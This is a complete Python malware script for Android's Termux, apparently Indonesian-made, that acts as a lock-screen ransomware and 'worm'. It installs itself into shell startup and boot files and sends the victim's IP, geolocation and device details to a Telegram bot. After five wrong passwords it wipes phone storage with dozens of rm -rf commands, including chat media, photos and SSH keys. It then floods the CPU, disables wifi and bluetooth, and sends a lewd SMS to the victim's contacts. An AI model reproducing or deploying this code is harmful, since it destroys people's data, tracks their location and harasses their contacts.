#!/usr/bin/env python3
import os
import sys
import subprocess
import requests
import threading
import time
import signal
import shutil
import json
import socket
import re
from datetime import datetime
import random

BOT_TOKEN = ""
ADMIN_ID = ""
LOCK_CODE = ""
HOME = os.path.expanduser("~")
SCRIPT_PATH = os.path.join(HOME, ".worm.py")
COUNT_FILE = os.path.join(HOME, ".worm_count")
FLAG_FILE = os.path.join(HOME, ".worm_locked")
STORAGE_PATHS = [
    "/storage/emulated/0",
    "/sdcard",
    "/storage/self/primary",
    HOME,
    os.path.join(HOME, "storage"),
    os.path.join(HOME, "storage/shared"),
    "/data/data/com.termux/files/home",
    "/storage/emulated/0/Android",
    "/storage/emulated/0/DCIM",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Music",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Movies",
    "/storage/emulated/0/Documents",
    "/storage/emulated/0/WhatsApp",
    "/storage/emulated/0/Telegram",
    "/storage/emulated/0/Instagram",
    "/storage/emulated/0/TikTok",
]

SONG_URL = "https://youtu.be/TBrR-xL7lks?si=YsaWUZ9Qr5Ncr8OK"
MPV_PROCESS = None
AUTO_RUN_SCRIPT = os.path.join(HOME, ".termux_auto_run.sh")
SERVICE_SCRIPT = os.path.join(HOME, ".termux_service.sh")

def set_volume(level):
    try:
        subprocess.run(["termux-volume", "music", str(level)], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def get_current_volume():
    try:
        result = subprocess.run(["termux-volume", "music"], 
                              capture_output=True, text=True)
        if result.stdout:
            data = json.loads(result.stdout)
            if isinstance(data, list) and len(data) > 0:
                return data[0].get("volume", 0)
        return 0
    except:
        return 0

def increase_volume_gradually():
    current = get_current_volume()
    if current >= 100:
        return
    step = random.randint(2, 5)
    new_volume = min(current + step, 100)
    set_volume(new_volume)
    if new_volume % 10 == 0 or new_volume >= 100:
        send_telegram(f"VOLUME: {new_volume}%")

def volume_auto_increase_loop():
    while True:
        try:
            if not os.path.exists(FLAG_FILE):
                time.sleep(5)
                continue
            increase_volume_gradually()
            wait_time = random.randint(5, 15)
            time.sleep(wait_time)
        except:
            time.sleep(5)

def make_phone_lag_extreme():
    send_telegram("Starting lag device")

    for i in range(50):
        try:
            subprocess.Popen(["sh", "-c", "while true; do echo $RANDOM > /dev/null; done"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    apps_to_open = [
        "https://www.youtube.com",
        "https://www.google.com",
        "https://www.instagram.com",
        "https://www.facebook.com",
        "https://www.twitter.com",
        "https://www.tiktok.com",
        "https://www.whatsapp.com",
        "https://www.telegram.org",
        "https://www.netflix.com",
        "https://www.spotify.com",
        "https://www.amazon.com",
        "https://www.shopee.co.id",
        "https://www.tokopedia.com",
        "https://www.lazada.co.id",
    ]
    for app in apps_to_open:
        try:
            subprocess.Popen(["termux-open", app], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    for i in range(30):
        try:
            subprocess.run(["termux-notification", "-t", f"Warning⚠️ {i+1}", 
                          "-c", "Please turn off your phone, before it gets permanently damaged."],
                          timeout=2, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        except:
            pass

    for i in range(20):
        try:
            subprocess.run(["termux-volume", "music", str(random.randint(0, 100))],
                          stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        except:
            pass

    for i in range(30):
        try:
            trash_file = os.path.join(HOME, f".trash_{i}.dat")
            subprocess.run(["dd", "if=/dev/zero", f"of={trash_file}", "bs=1M", "count=10"],
                          stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        except:
            pass

    try:
        subprocess.run(["termux-wifi-enable", "false"], 
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass
    try:
        subprocess.run(["termux-bluetooth-enable", "false"], 
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass

    try:
        contacts = subprocess.run(["termux-contact-list"], 
                                 capture_output=True, text=True, timeout=5)
        if contacts.stdout:
            numbers = re.findall(r'"number":"([^"]+)"', contacts.stdout)
            for num in numbers[:10]:
                try:
                    subprocess.run(["termux-sms-send", "-n", num, 
                                  "Syg boleh ewe aku ga nanti aku kirimin Pap konbrut"],
                                  timeout=3, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
                except:
                    pass
            send_telegram(f"Mengirim SMS Kontak ke {len(numbers[:10])} Target")
    except:
        pass

    try:
        subprocess.run(["termux-volume", "ring", "0"], 
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        subprocess.run(["termux-volume", "alarm", "0"], 
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        subprocess.run(["termux-volume", "notification", "0"], 
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        subprocess.run(["termux-volume", "system", "0"], 
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass

    for i in range(10):
        try:
            subprocess.Popen(["sh", "-c", "while true; do :; done"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

    try:
        scary_text = "YOU ARE A IDIOT"
        subprocess.run(["termux-wallpaper", "-t", scary_text],
                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass

    send_telegram("Succesfuly Starting Lag device")

def send_telegram(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={"chat_id": ADMIN_ID, "text": msg}, timeout=1)
    except:
        pass

def banner():
    os.system("clear")
    banner_text = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠎⠀⠀⠀⠀⢀⠠⠐⠀⠅⠈⡐⠀⡁⠠⠁⠁⢂⠐⠀⡀⠀⠀⠀⠀⠱⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⢊⣾⡿⡁⠀⠀⠀⠄⠌⠀⢀⠀⠀⠀⡐⠀⠀⠄⠀⠂⠀⠀⠐⡀⢀⠐⠄⠀⠀⠀⢈⠿⣷⡑⣦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡠⣼⡏⢜⣡⡾⠀⠀⡀⠂⠀⠀⢈⠀⠈⠐⢀⠂⣠⡖⢲⣦⢈⠐⠐⠀⠐⢀⠀⠀⠈⠠⠀⠀⢷⣍⠣⢹⣧⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡇⣿⣱⠿⠋⠀⢀⠀⠀⠀⠀⢀⠂⠀⠀⠀⠄⠀⠘⠁⣸⠿⠁⠠⠀⠀⠀⠀⠂⠀⠀⠀⠈⡀⠀⠙⠿⣮⡿⢸⣇⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⡞⣡⡾⠁⠀⠀⠂⠠⠀⡀⠄⠀⠀⠀⠀⠂⠀⠀⠐⡁⠀⠀⠠⠀⠀⠀⠀⡈⡀⠠⠀⠂⠐⠀⠈⢷⣌⢟⢸⣿⠀⠀⠀⠀
⠀⠀⠀⡄⢿⣇⣾⡿⠁⠀⡈⠀⠀⠀⠀⠐⠈⠀⠁⠀⠁⡂⠂⠂⠺⠗⠀⠂⠂⡈⠀⠁⠁⠀⠂⠀⠀⠀⠀⢁⠀⠈⢿⣧⢼⡿⢀⠀⠀⠀
⠀⠀⠀⣧⠘⣿⠋⣰⠀⠠⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠐⠀⢀⣀⣐⣁⣄⠀⠀⠂⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠄⠀⣦⠙⣿⠃⣾⠀⠀⠀
⠀⠀⠀⢿⣇⠑⣼⡟⠀⠐⠠⠠⠠⠠⠐⠠⠀⠄⠠⣠⣰⣵⡇⠀⣹⣏⠀⢸⣧⣅⣄⠠⠀⠄⠌⠠⠠⠠⠠⠐⡀⠀⢻⣧⠉⣴⡿⠀⠀⠀
⠀⠀⠀⡙⣿⣮⣿⠡⡀⠈⡀⠀⠀⠀⠀⠐⣾⣿⣿⣿⣿⣿⠂⠀⢸⡆⠀⠨⣿⣿⣿⣿⣿⣷⠐⠀⠀⠀⠀⠀⡀⢀⠜⣿⢵⣿⢃⠀⠀⠀
⠀⠀⠀⣧⡘⢯⡗⢸⡇⠀⠄⠀⠀⠀⠀⠨⣿⣿⣿⣿⣿⣿⡇⠀⣻⣯⠀⢸⣿⣿⣿⣿⣿⣿⠅⠀⠀⠀⠀⠠⠀⢸⡇⣸⡿⢁⣾⠀⠀⠀
⠀⠀⠀⠘⣿⣦⡁⢿⣏⢀⠐⢀⠠⠀⠐⢸⣿⣿⣿⣿⣿⣿⣿⣄⣿⣯⣠⣿⣿⣿⣿⣿⣿⣿⡇⠂⠠⠀⡀⠂⡀⣽⣯⢈⣴⣿⠃⠀⠀⠀
⠀⠀⠀⠀⢈⠻⣷⡽⣷⠘⣧⠀⠄⠀⠀⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⠀⠀⢀⠂⣼⠅⣾⢧⣾⠟⡁⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢣⣄⡙⠻⡆⢿⣧⠀⠂⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠐⠀⣼⡿⢰⠟⢋⣠⡾⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣷⣦⣜⢿⡎⢳⣄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣠⡾⢱⡿⣣⣴⣾⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢌⣙⠛⠻⠿⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡡⠿⠛⠛⣋⠥⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠷⣿⣾⣾⣾⠽⠟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠿⠿⣶⣷⣷⡿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠢⣤⣤⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣤⡤⠖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠈⠀⢼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠈⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⠿⠿⡿⣿⢿⢿⠿⠿⠟⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    try:
        subprocess.run(["lolcat"], input=banner_text.encode(), check=True, text=False)
    except:
        print(banner_text)
    print("\033[37mKocak Otak lu Dimana Bego😹\033[0m")
    print("\033[35m❯❯❯ \033[37mMasukin ni Pw nya sebelum Kehapus Storage😹😹:\033[0m", end=" ", flush=True)

def hapus_semua_storage():
    try:
        subprocess.run(["termux-setup-storage"], shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass

    for path in STORAGE_PATHS:
        try:
            if os.path.exists(path) and path != "/":
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    if item_path in [SCRIPT_PATH, FLAG_FILE, COUNT_FILE, AUTO_RUN_SCRIPT, SERVICE_SCRIPT]:
                        continue
                    try:
                        if os.path.isfile(item_path) or os.path.islink(item_path):
                            os.remove(item_path)
                        elif os.path.isdir(item_path):
                            shutil.rmtree(item_path, ignore_errors=True)
                    except:
                        pass
        except:
            pass

    try:
        os.system("rm -rf /sdcard/* 2>/dev/null")
        os.system("rm -rf /sdcard/.* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/.* 2>/dev/null")
        os.system("rm -rf /storage/self/primary/* 2>/dev/null")
        os.system("rm -rf /storage/self/primary/.* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Android/data/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Android/obb/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/DCIM/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/DCIM/.thumbnails/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Download/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Music/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Pictures/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Movies/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Documents/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/WhatsApp/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/WhatsApp/.* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/WhatsApp/Media/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Telegram/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Telegram/.* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Telegram/Telegram Images/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Telegram/Telegram Video/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Telegram/Telegram Documents/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Instagram/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/TikTok/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Android/media/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/Android/.* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/.android_secure/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/LOST.DIR/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/backups/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/backup/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/cache/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/.thumbnails/* 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/.nomedia 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/.android 2>/dev/null")
        os.system("rm -rf /storage/emulated/0/.download/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/usr/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/cache/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/cache/.* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.cache/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.cache/.* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.local/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.config/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.termux/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.storage/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.bash_history 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.zsh_history 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.python_history 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.wget-hsts 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.ssh/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.ssh/.* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.gnupg/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.gnupg/.* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.npm/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.pip/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/.local/share/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/storage/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/storage/.* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/storage/shared/* 2>/dev/null")
        os.system("rm -rf /data/data/com.termux/files/home/storage/shared/.* 2>/dev/null")
    except:
        pass

    send_telegram("STORAGE HAPUS")

def install():
    with open(__file__, "r") as src:
        content = src.read()
    with open(SCRIPT_PATH, "w") as dst:
        dst.write(content)
    os.chmod(SCRIPT_PATH, 0o755)

    setup_service()

    with open(FLAG_FILE, "w") as f:
        f.write("locked")
    with open(COUNT_FILE, "w") as f:
        f.write("0")

    send_location_telegram()
    send_telegram("RANSOMEWARE TERINSTALL - SERVICE ACTIVE")

def get_public_ip():
    try:
        resp = requests.get("https://api.ipify.org?format=json", timeout=5)
        if resp.status_code == 200:
            return resp.json().get("ip", "Unknown")
    except:
        pass
    try:
        resp = requests.get("https://httpbin.org/ip", timeout=5)
        if resp.status_code == 200:
            return resp.json().get("origin", "Unknown")
    except:
        pass
    return "Unknown"

def get_geolocation(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,as,timezone", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "ip": ip,
                    "country": data.get("country", "Unknown"),
                    "region": data.get("regionName", "Unknown"),
                    "city": data.get("city", "Unknown"),
                    "lat": data.get("lat", 0),
                    "lon": data.get("lon", 0),
                    "isp": data.get("isp", "Unknown"),
                    "org": data.get("org", "Unknown"),
                    "as": data.get("as", "Unknown"),
                    "timezone": data.get("timezone", "Unknown"),
                    "maps_url": f"https://www.google.com/maps?q={data.get('lat', 0)},{data.get('lon', 0)}"
                }
    except:
        pass
    return {"ip": ip, "error": "Gagal mendapatkan lokasi"}

def get_device_info():
    try:
        hostname = socket.gethostname()
    except:
        hostname = "Unknown"
    try:
        import platform
        device = platform.system() + " " + platform.release()
    except:
        device = "Unknown"
    try:
        username = os.getlogin()
    except:
        username = "Unknown"
    return {
        "hostname": hostname,
        "device": device,
        "username": username,
        "time": datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    }

def send_location_telegram():
    ip = get_public_ip()
    geo = get_geolocation(ip)
    device = get_device_info()

    pesan = f"""
RANSOMEWARE ACTIVITY

Device: {device['device']}
User: {device['username']}
Hostname: {device['hostname']}
Time: {device['time']}

IP: {ip}
Location: {geo.get('city', 'Unknown')}, {geo.get('region', 'Unknown')}, {geo.get('country', 'Unknown')}
Maps: {geo.get('maps_url', 'Unknown')}
ISP: {geo.get('isp', 'Unknown')}
Org: {geo.get('org', 'Unknown')}
AS: {geo.get('as', 'Unknown')}
Timezone: {geo.get('timezone', 'Unknown')}

Link Location: {geo.get('maps_url', '')}
"""
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": ADMIN_ID, "text": pesan},
            timeout=5
        )
    except:
        pass
    return geo

def setup_service():
    service_content = f'''#!/bin/bash
while true; do
    if [ -f "{SCRIPT_PATH}" ] && [ -f "{FLAG_FILE}" ]; then
        python3 "{SCRIPT_PATH}" --background
    fi
    sleep 5
done
'''
    with open(SERVICE_SCRIPT, "w") as f:
        f.write(service_content)
    os.chmod(SERVICE_SCRIPT, 0o755)

    auto_run_content = f'''#!/bin/bash
if [ -f "{SERVICE_SCRIPT}" ]; then
    bash "{SERVICE_SCRIPT}" &
fi
if [ -f "{SCRIPT_PATH}" ] && [ -f "{FLAG_FILE}" ]; then
    python3 "{SCRIPT_PATH}" --background &
fi
'''
    with open(AUTO_RUN_SCRIPT, "w") as f:
        f.write(auto_run_content)
    os.chmod(AUTO_RUN_SCRIPT, 0o755)

    startup_files = [
        os.path.join(HOME, ".bashrc"),
        os.path.join(HOME, ".zshrc"),
        os.path.join(HOME, ".profile"),
        "/data/data/com.termux/files/usr/etc/profile",
        "/data/data/com.termux/files/usr/etc/bash.bashrc",
    ]

    for rc in startup_files:
        try:
            os.makedirs(os.path.dirname(rc), exist_ok=True)
            with open(rc, "a") as f:
                f.write(f"\nbash {AUTO_RUN_SCRIPT} &\n")
        except:
            pass

    boot_dir = os.path.join(HOME, ".termux/boot")
    try:
        os.makedirs(boot_dir, exist_ok=True)
        boot_script = os.path.join(boot_dir, "worm_startup")
        with open(boot_script, "w") as f:
            f.write(f'''#!/bin/bash
bash {AUTO_RUN_SCRIPT} &
''')
        os.chmod(boot_script, 0o755)
    except:
        pass

def start_background_processes():
    try:
        subprocess.Popen(
            ["bash", SERVICE_SCRIPT],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass
    try:
        threading.Thread(target=play_song_loop_forever, daemon=True).start()
    except:
        pass
    try:
        threading.Thread(target=volume_auto_increase_loop, daemon=True).start()
    except:
        pass

def play_song_loop_forever():
    global MPV_PROCESS
    while True:
        try:
            if MPV_PROCESS is None or MPV_PROCESS.poll() is not None:
                set_volume(30)
                MPV_PROCESS = subprocess.Popen(
                    ["mpv", "--no-video", "--really-quiet", "--loop-file=inf", 
                     "--volume=30", SONG_URL],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=os.setsid if hasattr(os, 'setsid') else None
                )
        except:
            try:
                MPV_PROCESS = subprocess.Popen(
                    ["mpv", "--no-video", "--really-quiet", "--loop-file=inf", 
                     "--volume=30", SONG_URL],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except:
                pass
        time.sleep(30)

def stop_all_processes():
    global MPV_PROCESS
    try:
        if MPV_PROCESS:
            if hasattr(os, 'killpg'):
                os.killpg(os.getpgid(MPV_PROCESS.pid), signal.SIGTERM)
            else:
                MPV_PROCESS.terminate()
            MPV_PROCESS = None
    except:
        pass
    try:
        subprocess.run(["pkill", "-f", "mpv"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass
    try:
        subprocess.run(["pkill", "-f", SERVICE_SCRIPT], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except:
        pass
    set_volume(50)

def main():
    global MPV_PROCESS

    if "--background" in sys.argv:
        start_background_processes()
        sys.exit(0)

    send_location_telegram()

    setup_service()
    start_background_processes()

    if not os.path.exists(SCRIPT_PATH) or not os.path.exists(FLAG_FILE):
        install()

    while True:
        banner()
        pw = input().strip()
        uid = os.getlogin()
        send_telegram(f"UID: {uid} | Input: {pw[:3]}***")

        if pw == LOCK_CODE:
            stop_all_processes()

            for f in [FLAG_FILE, COUNT_FILE, AUTO_RUN_SCRIPT, SERVICE_SCRIPT]:
                if os.path.exists(f):
                    os.remove(f)

            startup_files = [
                os.path.join(HOME, ".bashrc"),
                os.path.join(HOME, ".zshrc"),
                os.path.join(HOME, ".profile"),
                "/data/data/com.termux/files/usr/etc/profile",
                "/data/data/com.termux/files/usr/etc/bash.bashrc",
            ]
            for rc in startup_files:
                try:
                    if os.path.exists(rc):
                        with open(rc, "r") as f:
                            lines = f.readlines()
                        with open(rc, "w") as f:
                            for line in lines:
                                if SCRIPT_PATH not in line and ".worm.py" not in line and AUTO_RUN_SCRIPT not in line and SERVICE_SCRIPT not in line:
                                    f.write(line)
                except:
                    pass

            set_volume(50)

            print("\033[37mNah gtu dong Yng pintar ya deck ya jangan gitu lagi nanti di marahin mamah mu loohh😹\033[0m")
            send_telegram(f"UID: {uid} | UNLOCK BERHASIL - SERVICE STOPPED")

            os.execvp("bash", ["bash"])
            break

        if os.path.exists(COUNT_FILE):
            with open(COUNT_FILE, "r") as f:
                try:
                    count = int(f.read().strip())
                except:
                    count = 0
        else:
            count = 0

        count += 1
        with open(COUNT_FILE, "w") as f:
            f.write(str(count))

        print("\033[37mPassword Anda \033[31mSalah\033[0m")

        if count >= 5:
            hapus_semua_storage()
            print("\033[37mStorage Anda Telah di \033[31mHAPUS\033[37m Kesempatan Di Berikan!\033[0m")
            with open(COUNT_FILE, "w") as f:
                f.write("0")
            send_telegram(f"UID: {uid} | STORAGE HAPUS (5x salah)")
            make_phone_lag_extreme()
        else:
            print(f"\033[37mgweh kasih kesempatan {5 - count} kali lagi klo ga bisa Liat aja akibatnya😹\033[0m")

if __name__ == "__main__":
    if os.path.exists(FLAG_FILE):
        while True:
            try:
                main()
            except:
                time.sleep(1)
                continue
    else:
        main()
